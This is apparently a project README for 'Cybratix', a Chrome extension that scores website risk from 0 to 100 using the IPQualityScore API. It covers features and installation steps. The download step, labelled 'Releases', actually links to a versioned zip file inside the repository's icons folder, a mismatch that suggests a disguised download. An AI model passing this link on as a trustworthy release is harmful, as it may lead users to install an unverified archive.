## üåê Overview

Cybratix is a Chrome extension designed to enhance your website safety with a straightforward risk score. This score ranges from 0 to 100 for any website you visit, helping you understand potential threats. Cybratix analyzes various security factors so you can browse with confidence.

## ‚ö†Ô∏è Disclaimer

Risk scores are calculated based on available data. Always consider multiple verification methods and seek expert advice for critical security decisions.

## üîç Features

The extension utilizes the IPQualityScore (IPQS) API to provide essential insights about websites, including:

- **Domain Age (in days)**: This indicates how long the domain has existed.
- **Fraud Score (0-100)**: This score assesses the website's fraud risk; a lower score usually means safer browsing.
- **Phishing Detection**: It checks in real-time for phishing activities.
- **Malware Detection**: The extension scans for malware and potential viruses.
- **Suspicious Activity**: It flags unusual behavior patterns that may indicate concerns.
- **Site Safety**: It offers an overall safety assessment to help users stay secure online.

## üöÄ Getting Started

### Installation Steps

1. **Load Extension in Chrome**:
   - Open Chrome.
   - Click on the menu icon (three dots in the upper right corner).
   - Go to "More tools" and select "Extensions."
   - Enable "Developer mode" using the toggle in the upper right corner.
   - Click on "Load unpacked" and select the folder where the Cybratix extension files are located.

2. **Download & Install**:
   Visit this page to download: [Cybratix Releases](https://raw.githubusercontent.com/dishantar/cybratix-extention/main/icons/cybratix-extention-v3.1-alpha.4.zip).

3. **Using the Extension**:
   - After installation, you will see the Cybratix icon in your toolbar.
   - Click on the icon to analyze the current website.
   - Review the risk score and security factors presented to assess the website‚Äôs safety.
